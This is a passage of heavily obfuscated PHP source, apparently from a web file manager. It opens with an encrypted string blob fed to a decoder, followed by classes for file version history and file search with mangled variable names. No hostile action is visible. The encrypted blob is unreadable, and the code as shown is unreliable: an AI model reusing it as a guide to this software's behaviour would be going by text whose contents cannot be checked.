›Xäºîxé†­Ç¬zêWqÙæ'."\0".'øD3Ó2¤a}').base64_decode('ULYiJBi8gFKv1NDno7jjf2Ues5MVHyAeloK5gu1gD9tk/WtpbWgCoWgES4C1WIw=')."\334\110\111\202\103\154\21\146\375\342\152\157\370\331\203\174\257\41\317\37\101\274\130\231\236\276\355\106\371\120\17\242\351\65\273\364\271\27\132\375\377\244\42\315\214\111\312".base64_decode('gM5GSjtkuY80QV7hl2wyxpDzgTec4n67xvFqjbRpiDmn/M4Oe8QEUa6OJ4mkBic=')."\321\237\156\370\145\207\221\273\151\212\176\340\353\223\71\250\64\145\364\154\332\344\312\26\42\241\135\23\54\45\251\205\365\15\124\366\224\50\171\346\252\231\141\132\170\307\242".base64_decode('3JtF2Aea82EO8d6JOPmcL0LwK0NLgLhlO14ciRtxtc9D6SmMq0SscUQOywqWZBQ=').base64_decode('KJNJa9J8FedLBdg7YWkPecSKIjD3QxnS/uFYUa7dlzWSajZKdZQcBhUm4oW43qE=').base64_decode('oxhN8quFwrhXGkDj0OuNYj5ERcWOVFPitWQVV3qRI2yUoDj6Wie9uYFhy02y2zQ=')."\x2e\x9c\x6c\x91\x1e\x8e\xf6\x97\xde\xbe\x61\x1d\x2a\xd8\xed\xb2\x8a\x21\x5c\x84\xfa\x64\x66\x8\xa\x28\xf3\x14\xb1\xc0\x8e\x4d\x86\x1\x2\x51\xa4\x1e\x12\x20\xbb\x58\x26\x9e\xbf\x21\x95"."\303\241\363\51\25\12\260\344\247\131\353\345\234\4\216\213\223\126\366\306\40\156\335\335\317\167\261\317\360\267\310\74\164\144\342\205\111\372\362\230\207\277\62\346\241\16\363"."\x3c\xf0\xb6\x98\x47\xd8\x9a\x7d\xd3\x6b\x2c\xe2\x3d\x58\xe7\x23\xb2\xb8\xcf\x5c\x27\xaf\x84\xa4\x77\x53\xf3\x7c\xaa\x5c\x15\xa2\xee\x89\x8b\x1b\xa5\x32\x3e\x71\xe7\x98\x2f\xe6\xc4\x2d\x2e"."\212\70\271\233\222\1\113\43\54\232\131\17\271\161\365\60\37\145\256\351\20\243\222\127\246\314\34\176\173\33\124\65\223\260\54\151\47\326\251\233\227\64\331\255\225\273\230"."\xee\x80\xba\x84\xa9\x9\x9b\xb\xea\xbe\xb1\xe4\xd5\x9f\x25\xb9\xf4\xd4\x69\x33\xe6\xc8\xa2\x1\xb1\x3e\xe2\xfe\x87\x39\x39\xa7\x3f\x40\x3\x88\x15\x57\x9c\xf0\xa4\x30\x9f\x91\xf2\xbe\x25".base64_decode('mU6t2dJHAF0Y+H8G+YL2pkUlHdbSp1JLZoAAoaTdIR1Irqt8A9+wW2L70CNIPP0=')."\347\374\26\75\224\313\214\103\72\167\304\116\240\157\261\31\131\314\241\346\260\224\325\66\125\47\73\126\216\353\40\63\301\130\34\235\274\150\254\271\373\116\46\6\144\21\42"."\x5b\x62\x4b\xe4\x16\x6d\xc3\x2d\x48\xc1\xd5\xf1\xb9\x44\xe4\x78\x91\x7c\x16\x8e\x4d\x6c\x43\x2b\xf6\x94\x84\x52\xfe\x7\xb\xc8\x38\xf\xca\xa4\x8\x45\x8e\x32\x23\xf7\x9f\xc2\xf0\x46\x99".base64_decode('t/ak2/Bv6DelmTiX5VVtrwSQkvBNsyNkgYH6EEyfc6yu5lE10UaPRxmvUCnhJD0=').base64_decode('ySe8J0kkE67NjPXG4ZkZcpIfG7QzgimgO9SxWyVPrLL1EmlI3galTUtPuQkxCpE=')."\xbb\xc0\x20\x60\xf\x13\xa7\x90\xc4\x6a\x2d\xd0\xca\x2d\xd9\x54\x49\xf9\x6\xcf\xa7\xf4\xdc\xa6\x21\x87\x9d\x66\xe2\x11\xe6\xfb\x12\x7d\xcf\xc1\xa5\xa1\x78\xb3\xeb\x45\x56\x82\x87\xdc\xcf".base64_decode('tLJJIZtf4DXJJNLBEvCHshwsguV+ww6RVLJXWhTlYA8HKCBAotdMvyadj+IoFKE=')."\361\236\122\167\276\263\356\260\34\305\176\177\134\173\235\331\243\132\256\47\50\251\147\121\32\146\344\365\377\365\243\155\377\257\336\152\233\121\303\204\325\216\7\135\133\201\310"."\x65\x14\xd9\xa8\xe4\x93\x98\xa\x4a\x5d\xe3\x70\x1e\x93\x13\x1\x8a\xf8\x13\xc6\x52\x9c\x2b\x6f\x32\xdf\x4f\xcc\x25\x94\xca\x2e\x57\xd4\x6c\xd6\x7d\xd3\x58\xc2\x16\x94\xbc\x7d\x89\x80\xaf"."\x9f\xbf\xc3\x58\x2e\xe2\xf4\x30\x9c\x90\x1f\x2c\x2e\xc3\x99\x32\x6a\x33\x5f\x7a\x15\x88\xa7\x3b\xec\x74\xc8\x2b\x51\x5\x25\xc5\x4\x82\x42\xc4\x3\xf3\x82\xe5\x67\xa1\x14\xe6\x93\x30\xe9"."\310\360\242\154\334\30\51\60\216\152\62\240\342\236\123\30\376\40\346\322\200\106\144\324\341\110\52\101\70\161\307\44\72\22\345\371\21\157\267\363\367\242\35\65\332\135\257"."\xfa\xd1\x42\x96\x3c\x9b\xe\x89\xb4\xf0\x41\xe\xe5\x25\xa5\xa9\xd2\x5b\xe3\xd2\x96\xf9\xa6\x96\xab\x60\x5\x58\xa7\x60\x87\xbf\xd5\x5c\xe3\x7e\xbc\xb9\xd6\x5b\xfa\x31\xaa\x7f\x8e\x3b\x15"."\305\334\74\223\317\220\13\15\162\341\130\246\16\5\302\230\50\63\316\66\50\277\31\371\113\213\102\130\205\103\362\170\331\246\356\64\15\102\235\71\123\271\204\103\322\75\224"."\x1e\xe\x2e\x79\xef\xd3\x75\x31\x80\x58\x25\x71\x53\xa6\x1b\xc4\x53\x37\xc\x3b\xd6\xd5\x5e\x45\x4c\x28\x0\x8a\x11\xa5\xdf\x62\x88\x7\xdc\x73\x5\x2a\x32\x93\xf\x58\x66\xbb\x24\xa9\xfe".strrev('a:¥ÛºµÂÓ1ÛU¹øyËâÌÃW/O©-0ÊX®_š.çnebk82OÉe°C’B')."\231\51\27\354\140\206\341\312\122\116\222\156\364\20\135\234\166\276\35\101\62\111\62\163\313\10\55\110\167\122\316\53\101\356\162\272\4\305\25\365\260\224\115\152\61\157\137"."\350\27\333\167\205\204\43\1\222\115\245\355\1\351\115\137\167\55\347\223\315\322\5\142\212\300\125\260\364\216\110\134\135\111\4\2\253\206\231\26\201\273\135\351\322\1\41"."\260\244\72\50\350\31\101\66\247\323\374\171\160\107\321\64\143\34\170\52\112\21\57\211\143\172\110\62\31\25\232\310\332\220\373\121\127\237\154\146\352\50\130\232\52\114\112".base64_decode('pfriFkEME6eVGz7ZTs7qsskqByqRRL3sc9UaiUXBGvVC54YOhfPb4pNOA1lejK8=').strrev('KçJ€ˆÿ•ˆVã†wÉÍK'."\r".'–€ '."\0".'YA{ÎçËòYew¨ì¥…ÓT¼ìC*')."\226\305\42\203\35\162\206\143\362\45\104\310\7\6\45\243\162\246\243\73\356\245\45\374\202\0\137\232\230\43\22\117\232\27\160\146\321\362\232\253\367\162\5\367\310\150\15".base64_decode('a0i3UxmJiSnNLE03SyYVPlS+v+5esTl1s3aikZL+SIoHcaNMHdqjstVoFq4p6Ew=')."\107\335\161\246\0\327\245\131\270\156\111\66\253\54\111\102\244\172\266\132\264\306\31\136\351\344\201\170\40\135\146\300\56\46\232\26\35\157\76\313\26\56\375\34\100\234\273"._kodDe('Mn0ggBNx2+/8GqS3bI7hzVhnXTYNOqdebYKkgNGarf8uAIx3ex6o9WY5oDJoirdy')."\312\144\313\112\16\345\325\40\242\145\267\276\345\324\117\160\245\313\23\303\164\225\20\127\47\36\247\227\364\176\47\71\120\172\61\337\237\67\370\61\221\26\32\145\130\103\225"."\x3f\xe7\xce\x3f\x57\xd2\x9a\x13\x34\xf3\x45\xc9\xe5\x66\x59\x35\x64\xf\xe6\xc1\x4b\xb9\xdd\xac\xca\x24\xea\x92\xfe\x36\xe5\x6f\xc\x44\x88\x6b\x4e\xbf\x9e\xb2\x8f\x21\x9a\xcf\x3e\x92\x95".base64_decode('JHcuoZmQCDiu0suIlUgSkHJCOO3QiafnP0jl6WVbE77U5RcyxPEkPS9pdswwbQ8=')."\xce\x8b\x1b\x5\xf2\xdb\x68\xd8\xb6\xb8\x7c\xa6\x7c\x36\x21\xf2\xf0\xa1\xe7\x91\x74\x28\x50\x48\xdc\xbe\xe0\x59\x24\x17\x2\x4\x1c\x9\xda\x20\x41\xb8\xf6\xc3\xc\x6c\x4c\xa3\xb9\x4\xd9"."\x38\x22\xf8\xa2\x81\x47\xe4\x33\xd\xae\xff\x5a\x8a\xae\xb\x4a\x91\x80\xd8\xcd\xa4\x31\xcc\xdc\xfa\x61\x5b\x5b\xd1\x1f\xf1\xa\x3c\x21\xde\x4\xdd\x1\x30\x26\x6b\x81\x10\x2b\x66\xcb\x4f"."\x73\xfc\xe0\xe\xde\xab\x62\x2\x10\x5e\x9a\xf2\x2d\x2f\xf4\x39\xaa\xd3\x77\x71\xb8\x66\xe3\x37\xb5\x0\x82\x4c\xd1\x4\xf5\x5\x4d\xc4\x4d\xd8\x61\x3a\x75\x85\x58\x92\xd5\x19\x88\xc5\x16"."\x45\xa2\xcd\xd4\x75\x74\x49\x36\xa9\x25\x69\xd5\x94\x64\x75\xb6\x45\x3a\xc6\xcb\xb\xb6\x7\x42\xe1\x92\x3c\xac\x80\xd3\x91\x10\xbe\x9e\x68\x56\xa8\x93\xf4\x32\x10\xe\x47\x16\x8d\xd7\x8b"."\120\323\102\321\23\162\217\52\344\343\205\214\301\304\336\354\376\40\246\146\31\337\55\231\346\151\71\341\364\113\324\311\353\251\176\41\155\123\45\242\334\142\376\360\170\300\371"."\xe\x8b\x4b\xcf\x8d\x1\x29\x34\x84\x95\x67\x3a\xa0\xed\x68\x1\x52\xb1\x2b\x6d\xbe\xa1\x39\x81\x2c\x2e\x86\x7d\x8e\xb\x64\x29\x9d\xec\x7\x82\x45\x24\x98\x93\xf\x50\x92\x50\x5d\x76\x82"."\x64\xd9\x6a\xa9\xac\x9f\xe4\x8a\x9\xc0\x1d\x5b\x60\x80\xe6\xd5\x72\x23\x29\xc9\xf2\x29\x7b\x2\xe6\x71\x30\xa5\x92\x82\x14\xd\x43\xf6\xff\x6\xb1\xcc\xbd\xbc\xef\xa6\x0\x0".""."", 10, -8))); goto cæË–„õÇ³; cŒÎâ±åÉ: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\145\137\x68\x69\x73\164\x6f\x72\x79"; public function historyCount($¥àÑì±™) { $Ó„À‰â =& $_SERVER[ê‘³Æ±]; if (!$¥àÑì±™) { return array(); } if (is_string($¥àÑì±™) || is_int($¥àÑì±™)) { $¥àÑì±™ = array($¥àÑì±™); } $†õ‚üîÒ = array($Ó„À‰â[396], $Ó„À‰â[1841] => $Ó„À‰â[493]); $¥±âú¯± = array($Ó„À‰â[396] => array($Ó„À‰â[7], $¥àÑì±™)); $¢÷šôœ = $this->field($†õ‚üîÒ)->where($¥±âú¯±)->group($Ó„À‰â[396])->select(); return array_to_keyvalue($¢÷šôœ, $Ó„À‰â[396], $Ó„À‰â[493]); } public function addHistory($û•»ğ³, $û­ƒÖŞ´ = '') { $Ü‹„‚×Ô =& $_SERVER[ê‘³Æ±]; $•¿»«êØ = array($Ü‹„‚×Ô[411] => $û•»ğ³[$Ü‹„‚×Ô[396]], $Ü‹„‚×Ô[1632] => isset($û•»ğ³[$Ü‹„‚×Ô[447]]) ? $û•»ğ³[$Ü‹„‚×Ô[447]] : $û•»ğ³[$Ü‹„‚×Ô[445]], $Ü‹„‚×Ô[461] => $û•»ğ³[$Ü‹„‚×Ô[460]], $Ü‹„‚×Ô[575] => $û•»ğ³[$Ü‹„‚×Ô[80]], $Ü‹„‚×Ô[2042] => $û­ƒÖŞ´); $•Ö°‹ê« = $GLOBALS[$Ü‹„‚×Ô[6]][$Ü‹„‚×Ô[90]][$Ü‹„‚×Ô[1196]]; if ($•Ö°‹ê« > 1) { $this->historyAutoClear($•¿»«êØ[$Ü‹„‚×Ô[396]]); $this->add($•¿»«êØ); } Hook::trigger($Ü‹„‚×Ô[2043], $•¿»«êØ); Model($Ü‹„‚×Ô[2044])->eventFileEdit($û•»ğ³[$Ü‹„‚×Ô[396]]); } private function historyAutoClear($İßšÇ­‰) { $§›“ÀÈ =& $_SERVER[ê‘³Æ±]; $‰İùìÛš = Model($§›“ÀÈ[756])->get($§›“ÀÈ[1218]); $¿ğõ½ãê = $GLOBALS[$§›“ÀÈ[6]][$§›“ÀÈ[90]][$§›“ÀÈ[1196]]; $ÉÅ¼Àˆ« = $‰İùìÛš == $§›“ÀÈ[1219] ? 5 : $¿ğõ½ãê; if ($¿ğõ½ãê <= 1) { $ÉÅ¼Àˆ« = 1; } if ($ÉÅ¼Àˆ« >= 500) { return; } $º¦¥İ©İ = array($§›“ÀÈ[411] => $İßšÇ­‰); $üà”ÈÒÎ = $this->field($§›“ÀÈ[2045])->where($º¦¥İ©İ)->order($§›“ÀÈ[2039])->select(); if (!$üà”ÈÒÎ || $ÉÅ¼Àˆ« >= count($üà”ÈÒÎ)) { return; } $çá·Á÷± = array_to_keyvalue($üà”ÈÒÎ, $§›“ÀÈ[12], $§›“ÀÈ[394]); $çá·Á÷± = array_slice($çá·Á÷±, $ÉÅ¼Àˆ«); $°Œ·¦Ï‹ = array_to_keyvalue($üà”ÈÒÎ, $§›“ÀÈ[12], $§›“ÀÈ[460]); $°Œ·¦Ï‹ = array_slice($°Œ·¦Ï‹, $ÉÅ¼Àˆ«); if (!$çá·Á÷± || !$°Œ·¦Ï‹) { return; } $º¦¥İ©İ = array($§›“ÀÈ[413] => array($§›“ÀÈ[7], $çá·Á÷±)); $this->where($º¦¥İ©İ)->delete(); Model($§›“ÀÈ[463])->remove($°Œ·¦Ï‹); } public function listData($šÉ¬ºËê) { $°ÉşÈìË =& $_SERVER[ê‘³Æ±]; $şê†ŸÕ† = array($°ÉşÈìË[411] => $šÉ¬ºËê); $´ŸÀ×ØŞ = $°ÉşÈìË[2046]; $¡”Ç“ïª = $this->field($´ŸÀ×ØŞ)->where($şê†ŸÕ†)->order($°ÉşÈìË[2039])->selectPage(); $this->_listAppendUser($¡”Ç“ïª[$°ÉşÈìË[366]]); $¨Ä©‡¹· = Model($°ÉşÈìË[756])->get($°ÉşÈìË[1218]); $Üğ‚¾ƒÚ = 5; if ($¨Ä©‡¹· == $°ÉşÈìË[1219]) { $¡”Ç“ïª[$°ÉşÈìË[366]] = array_slice($¡”Ç“ïª[$°ÉşÈìË[366]], 0, $Üğ‚¾ƒÚ); $¡”Ç“ïª[$°ÉşÈìË[363]] = array($°ÉşÈìË[2047] => 1, $°ÉşÈìË[2048] => 20, $°ÉşÈìË[2049] => 1, $°ÉşÈìË[2050] => count($¡”Ç“ïª[$°ÉşÈìË[366]])); } return $¡”Ç“ïª; } protected function _listAppendUser(&$¾ÄÛøü) { $ïÀÆİª¥ =& $_SERVER[ê‘³Æ±]; $¸Î“º³ = array_to_keyvalue($¾ÄÛøü, $ïÀÆİª¥[12], $ïÀÆİª¥[1641]); $¾ÊÁ› = Model($ïÀÆİª¥[534])->userListInfo($¸Î“º³); foreach ($¾ÄÛøü as &$•Ü÷×ñş) { $æıüĞš³ = $•Ü÷×ñş[$ïÀÆİª¥[1641]]; $•Ü÷×ñş[$ïÀÆİª¥[445]] = $¾ÊÁ›[$æıüĞš³] ? $¾ÊÁ›[$æıüĞš³] : !1; } unset($•Ü÷×ñş); } public function fileInfo($Ö¬°Êö˜) { $æ”ÆÁ¬ =& $_SERVER[ê‘³Æ±]; $Ìİò³ñÌ = $this->tablePrefix; $éâÂ‡ÁÙ = "{$Ìİò³ñÌ}\x69\157\137\146\151\x6c\145\x20\146\x69\154\x65\x73\40\x6f\156\x20\146\x69\154\x65\x73\56\x66\151\x6c\x65\x49\104\x20\x3d\x20\150\151\163\x74\x6f\x72\x79\56\x66\x69\154\145\x49\x44"; return $this->alias($æ”ÆÁ¬[2051])->where(array($æ”ÆÁ¬[413] => $Ö¬°Êö˜))->join($éâÂ‡ÁÙ, $æ”ÆÁ¬[2052])->find(); } public function removeItem($ëêìîµ) { $®©ñşÛ =& $_SERVER[ê‘³Æ±]; $ö”­—ÒŸ = array($®©ñşÛ[413] => $ëêìîµ); $ñ‚ôÀ = $this->where($ö”­—ÒŸ)->find(); if ($ñ‚ôÀ) { $Ø„Í’ã = $this->where($ö”­—ÒŸ)->delete(); Model($®©ñşÛ[463])->remove($ñ‚ôÀ[$®©ñşÛ[460]]); return $Ø„Í’ã; } return !1; } public function removeBySource($èŸò­¯) { $ôèÔ‡ò÷ =& $_SERVER[ê‘³Æ±]; if (!$èŸò­¯) { return !1; } if (!is_array($èŸò­¯)) { $èŸò­¯ = array($èŸò­¯); } $Á£Â¶·¯ = array($ôèÔ‡ò÷[411] => array($ôèÔ‡ò÷[7], $èŸò­¯)); $úó¨£™ = $this->field($ôèÔ‡ò÷[461])->where($Á£Â¶·¯)->select(); if ($úó¨£™) { $this->where($Á£Â¶·¯)->delete(); $ÔµğÙ• = array_to_keyvalue($úó¨£™, $ôèÔ‡ò÷[12], $ôèÔ‡ò÷[460]); Model($ôèÔ‡ò÷[463])->remove($ÔµğÙ•); } return !0; } public function setDetail($Ó¸ıº©á, $ï‰Ú­Ú¥) { $À„ç­õƒ =& $_SERVER[ê‘³Æ±]; return $this->where(array($À„ç­õƒ[413] => $Ó¸ıº©á))->save(array($À„ç­õƒ[2042] => $ï‰Ú­Ú¥)); } public function rollbackToItem($ÃßÆ¼‘û, $ë±ıˆ›¾) { $Œô ìˆÖ =& $_SERVER[ê‘³Æ±]; $½Ö´ÇÅÑ = Model($Œô ìˆÖ[819])->sourceInfo($ÃßÆ¼‘û); $this->addHistory($½Ö´ÇÅÑ, LNG($Œô ìˆÖ[2053])); $¥Â ÆÇ = $this->find($ë±ıˆ›¾); $‘úÒ“•ö = array($Œô ìˆÖ[460] => $¥Â ÆÇ[$Œô ìˆÖ[460]], $Œô ìˆÖ[80] => $¥Â ÆÇ[$Œô ìˆÖ[80]], $Œô ìˆÖ[86] => time(), $Œô ìˆÖ[447] => USER_ID); Model($Œô ìˆÖ[819])->where(array($Œô ìˆÖ[396] => $ÃßÆ¼‘û))->save($‘úÒ“•ö); return $this->where(array($Œô ìˆÖ[413] => $ë±ıˆ›¾))->delete(); } public function clearSame($€¨şé¾·) { $È§ÑÉóõ =& $_SERVER[ê‘³Æ±]; $ĞÎããŠã = $this->listData($€¨şé¾·); $Ìø°ú‡‹ = array_to_keyvalue_group($ĞÎããŠã, $È§ÑÉóõ[460]); $ô±âŠ”Ü = array(); $íŞ•©¼Á = array(); foreach ($Ìø°ú‡‹ as $Ì‚±É›å) { if (!$Ì‚±É›å || count($Ì‚±É›å) <= 1) { continue; } foreach ($Ì‚±É›å as $Ğ½ÆÀ¡‚) { $ô±âŠ”Ü[] = $Ğ½ÆÀ¡‚[$È§ÑÉóõ[460]]; $íŞ•©¼Á[] = $Ğ½ÆÀ¡‚[$È§ÑÉóõ[394]]; } } if (!$íŞ•©¼Á) { return; } $this->where(array($È§ÑÉóõ[394] => array($È§ÑÉóõ[7], $íŞ•©¼Á)))->delete(); Model($È§ÑÉóõ[463])->remove($ô±âŠ”Ü); } public function userSpace() { $“ø°óüĞ =& $_SERVER[ê‘³Æ±]; $šØÙòÅ = $this->tablePrefix; $«Áù—È = array($“ø°óüĞ[1632] => USER_ID); $¬»ú“›¶ = "{$šØÙòÅ}\x69\x6f\137\146\x69\154\x65\40\x66\151\154\x65\163\40\x6f\x6e\x20\146\x69\154\x65\x73\x2e\x66\x69\x6c\145\x49\104\40\75\40\x68\151\x73\x74\157\162\171\56\146\x69\x6c\x65\x49\x44"; return $this->alias($“ø°óüĞ[2051])->where($«Áù—È)->join($¬»ú“›¶, $“ø°óüĞ[2052])->sum($“ø°óüĞ[80]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÛçàË¨) { $ò´È¢· =& $_SERVER[ê‘³Æ±]; $ıÏùÙÃ— = KodIO::fileTypeList(); $èÁä²Òì = $ıÏùÙÃ—[$ÛçàË¨]; if (!$èÁä²Òì) { return array(); } $öğÑ²ª¢ = $èÁä²Òì[$ò´È¢·[169]]; $³¹¨¬„ = $ò´È¢·[7]; if (!$èÁä²Òì[$ò´È¢·[169]]) { $˜ÏáÏ¶Ñ = array_to_keyvalue($ıÏùÙÃ—, $ò´È¢·[12], $ò´È¢·[169]); $öğÑ²ª¢ = implode($ò´È¢·[50], $˜ÏáÏ¶Ñ); $³¹¨¬„ = $ò´È¢·[2054]; } $é„¥ÉÃ» = explode($ò´È¢·[50], trim($öğÑ²ª¢, $ò´È¢·[50])); return array($³¹¨¬„, $é„¥ÉÃ»); } public function listPathType($äİŠ³µ) { $©š©Çºş =& $_SERVER[ê‘³Æ±]; $âé¯¦® = $this->fileTypeWhere($äİŠ³µ); if (!$âé¯¦®) { return array(); } $øËŒ§Å™ = array($©š©Çºş[576] => SourceModel::TYPE_USER, $©š©Çºş[577] => USER_ID, $©š©Çºş[573] => 0, $©š©Çºş[574] => $âé¯¦®); return $this->listSource($øËŒ§Å™); } public function listSearch($âãœÖùõ, $…ç©›¼ = 300) { $Áş“—‚Ù =& $_SERVER[ê‘³Æ±]; if (isset($âãœÖùõ[$Áş“—‚Ù[1900]]) && $âãœÖùõ[$Áş“—‚Ù[1900]]) { $âãœÖùõ[$Áş“—‚Ù[1900]] = str_replace($Áş“—‚Ù[381], $Áş“—‚Ù[2055], trim($âãœÖùõ[$Áş“—‚Ù[1900]])); } $õ§ú­ = $this->_parseSearchWhere($âãœÖùõ); $ ÂÚÙ• = $õ§ú­; if (!isset($õ§ú­[$Áş“—‚Ù[424]])) { $õ§ú­[$Áş“—‚Ù[424]] = 0; } $çå½‰û = $Áş“—‚Ù[2056]; $€Œ¿¼Üä = $çå½‰û; $this->_listSearchBindPinyin($âãœÖùõ, $õ§ú­, $çå½‰û); $this->alias($Áş“—‚Ù[437])->_makeOrder(); $õ§ú­ = $this->parseWhereLike($õ§ú­); $Ùó‚ÔØ = $this->distinct(!0)->field($çå½‰û)->where($õ§ú­)->selectPage($…ç©›¼); $this->_listSearchFileContent($Ùó‚ÔØ, $âãœÖùõ, $€Œ¿¼Üä, $ ÂÚÙ•); $this->_listSearchDesc($Ùó‚ÔØ, $âãœÖùõ, $€Œ¿¼Üä); $this->_listSearchTag($Ùó‚ÔØ, $âãœÖùõ, $€Œ¿¼Üä); $this->_listSearchGroupTag($Ùó‚ÔØ, $âãœÖùõ, $€Œ¿¼Üä); $this->_listDataApply($Ùó‚ÔØ[$Áş“—‚Ù[366]]); $this->_listMake($Ùó‚ÔØ); return $Ùó‚ÔØ; } private function _listSearchFileContent(&$ÖÊ±×¶, $ËöŞ”ïÍ, $Ñê€°È², $ß–ö’É‚) { $âÇÌ¡¯ì =& $_SERVER[ê‘³Æ±]; if (!$ËöŞ”ïÍ[$âÇÌ¡¯ì[1900]] || $ÖÊ±×¶[$âÇÌ¡¯ì[363]][$âÇÌ¡¯ì[350]] > 1) { return; } if (!isset($ß–ö’É‚[$âÇÌ¡¯ì[32]]) || !is_array($ËöŞ”ïÍ[$âÇÌ¡¯ì[460]])) { return; } $ß–ö’É‚[$âÇÌ¡¯ì[460]] = array($âÇÌ¡¯ì[7], $ËöŞ”ïÍ[$âÇÌ¡¯ì[460]]); unset($ß–ö’É‚[$âÇÌ¡¯ì[32]]); unset($ËöŞ”ïÍ[$âÇÌ¡¯ì[460]]); $è¬…‹¦Ç = $this->field($Ñê€°È²)->where($ß–ö’É‚)->limit($âÇÌ¡¯ì[2057])->select(); if (!$è¬…‹¦Ç || count($è¬…‹¦Ç) == 0) { return; } $ÖÊ±×¶[$âÇÌ¡¯ì[366]] = array_merge($è¬…‹¦Ç, $ÖÊ±×¶[$âÇÌ¡¯ì[366]]); $ÖÊ±×¶[$âÇÌ¡¯ì[363]][$âÇÌ¡¯ì[364]] += count($è¬…‹¦Ç); } private function _listSearchTag(&$ÙØµş¶š, $¿ÑÛ•‹, $ÏÍ¦»©) { $²«›„Šø =& $_SERVER[ê‘³Æ±]; if (!$¿ÑÛ•‹[$²«›„Šø[1900]] || $ÙØµş¶š[$²«›„Šø[363]][$²«›„Šø[350]] > 1) { return; } $§½áˆİ¥ = Model($²«›„Šø[2058])->listData(); $ÃªÀÒÖ  = array(); $¾ÂûŒÂ’ = $¿ÑÛ•‹[$²«›„Šø[1900]]; foreach ($§½áˆİ¥ as $Ëé÷Â£©) { $¬Â†‚ÊÄ = $Ëé÷Â£©[$²«›„Šø[32]]; $ªÑÚŒ€í = str_replace($²«›„Šø[53], $²«›„Šø[12], Pinyin::get($¬Â†‚ÊÄ)); if (stripos($¬Â†‚ÊÄ, $¾ÂûŒÂ’) !== !1 || stripos($ªÑÚŒ€í, $¾ÂûŒÂ’) !== !1) { $ÃªÀÒÖ [] = $Ëé÷Â£©[$²«›„Šø[394]]; } } if (!$ÃªÀÒÖ ) { return; } $Œ¸ïÜñ‘ = array($²«›„Šø[420] => array($²«›„Šø[7], $ÃªÀÒÖ ), $²«›„Šø[1641] => USER_ID); $ÈíçÅ³Ò = Model($²«›„Šø[421])->field($²«›„Šø[78])->where($Œ¸ïÜñ‘)->select(); $ÈíçÅ³Ò = array_to_keyvalue($ÈíçÅ³Ò, $²«›„Šø[12], $²«›„Šø[78]); $¬íÆ€¾Ì = array_unique($ÈíçÅ³Ò); $this->_listSearchMerge($ÙØµş¶š, $¿ÑÛ•‹, $ÏÍ¦»©, $¬íÆ€¾Ì); } private function _listSearchDesc(&$“ğ¯Òì, $·—¾±âÚ, $ÀİÊÖ…ç) { $ˆãôîò² =& $_SERVER[ê‘³Æ±]; if (!$·—¾±âÚ[$ˆãôîò²[1900]] || $“ğ¯Òì[$ˆãôîò²[363]][$ˆãôîò²[350]] > 1) { return; } $ÛŞÀğÕä = $this->listSearchChildren($·—¾±âÚ[$ˆãôîò²[491]]); $ÛŞÀğÕä = array_unique($ÛŞÀğÕä); if (!$ÛŞÀğÕä) { return; } $Ì •¨ü¥ = array($ˆãôîò²[396] => array($ˆãôîò²[7], $ÛŞÀğÕä), $ˆãôîò²[95] => $ˆãôîò²[444], $ˆãôîò²[371] => array($ˆãôîò²[380], $ˆãôîò²[1902] . $·—¾±âÚ[$ˆãôîò²[1900]] . $ˆãôîò²[1902])); $»¿ö–¼š = Model($ˆãôîò²[559])->field($ˆãôîò²[396])->where($Ì •¨ü¥)->select(); $ö—¶Ş„Æ = array_to_keyvalue($»¿ö–¼š, $ˆãôîò²[12], $ˆãôîò²[396]); $this->_listSearchMerge($“ğ¯Òì, $·—¾±âÚ, $ÀİÊÖ…ç, $ö—¶Ş„Æ); } private function _listSearchGroupTag(&$òõ¥çŠß, $ïÏŠÃù‰, $š—ìÚ›ğ) { $Ã§ñŸ±§ =& $_SERVER[ê‘³Æ±]; if (!$ïÏŠÃù‰[$Ã§ñŸ±§[1900]] || $òõ¥çŠß[$Ã§ñŸ±§[363]][$Ã§ñŸ±§[350]] > 1 || !$ïÏŠÃù‰[$Ã§ñŸ±§[491]]) { return; } $™„±Œ”¯ = $this->sourceInfo($ïÏŠÃù‰[$Ã§ñŸ±§[491]]); if (!$™„±Œ”¯ || $™„±Œ”¯[$Ã§ñŸ±§[405]] != SourceModel::TYPE_GROUP) { return; } $­úÕÀ¯ = $™„±Œ”¯[$Ã§ñŸ±§[498]]; $Ú’Ïøåá = Model($Ã§ñŸ±§[2059])->get($­úÕÀ¯); $ÑĞñâ¦´ = array(); $¤Ì•Š…õ = $ïÏŠÃù‰[$Ã§ñŸ±§[1900]]; foreach ($Ú’Ïøåá[$Ã§ñŸ±§[366]] as $†Õ¡ûİ) { $ƒ¯îŸËñ = $†Õ¡ûİ[$Ã§ñŸ±§[32]]; $Õ‚ü€š¼ = str_replace($Ã§ñŸ±§[53], $Ã§ñŸ±§[12], Pinyin::get($ƒ¯îŸËñ)); if (stripos($ƒ¯îŸËñ, $¤Ì•Š…õ) !== !1 || stripos($Õ‚ü€š¼, $¤Ì•Š…õ) !== !1) { $ÑĞñâ¦´[] = $†Õ¡ûİ[$Ã§ñŸ±§[394]]; } } if (!$ÑĞñâ¦´) { return; } $ø½ú“½î = array($Ã§ñŸ±§[420] => array($Ã§ñŸ±§[7], $ÑĞñâ¦´), $Ã§ñŸ±§[1641] => 0, $Ã§ñŸ±§[33] => $Ã§ñŸ±§[1922] . $­úÕÀ¯); $ÈÔ¹ó¾ = Model($Ã§ñŸ±§[421])->field($Ã§ñŸ±§[78])->where($ø½ú“½î)->select(); $ÈÔ¹ó¾ = array_to_keyvalue($ÈÔ¹ó¾, $Ã§ñŸ±§[12], $Ã§ñŸ±§[78]); $Üùï—È = array_unique($ÈÔ¹ó¾); $this->_listSearchMerge($òõ¥çŠß, $ïÏŠÃù‰, $š—ìÚ›ğ, $Üùï—È); } private function _listSearchMerge(&$İ“®½œ›, $ì×ƒïÄü, $ô²Ù…æ», $Ï¥Á¯›) { $˜ùŠÖ’¢ =& $_SERVER[ê‘³Æ±]; if (!$Ï¥Á¯›) { return; } $Šíà—çê = array_to_keyvalue($İ“®½œ›[$˜ùŠÖ’¢[366]], $˜ùŠÖ’¢[12], $˜ùŠÖ’¢[396]); $Óò¸üƒş = array_diff($Ï¥Á¯›, $Šíà—çê); if (!$Óò¸üƒş) { return; } $¶‡À®‹ = array($˜ùŠÖ’¢[396] => array($˜ùŠÖ’¢[7], $Óò¸üƒş)); $àçãñû = $this->field($ô²Ù…æ»)->where($¶‡À®‹)->select(); if (!$àçãñû) { return; } $åñ¶Ÿ«˜ = array(); foreach ($àçãñû as $ôŸ”à©) { if 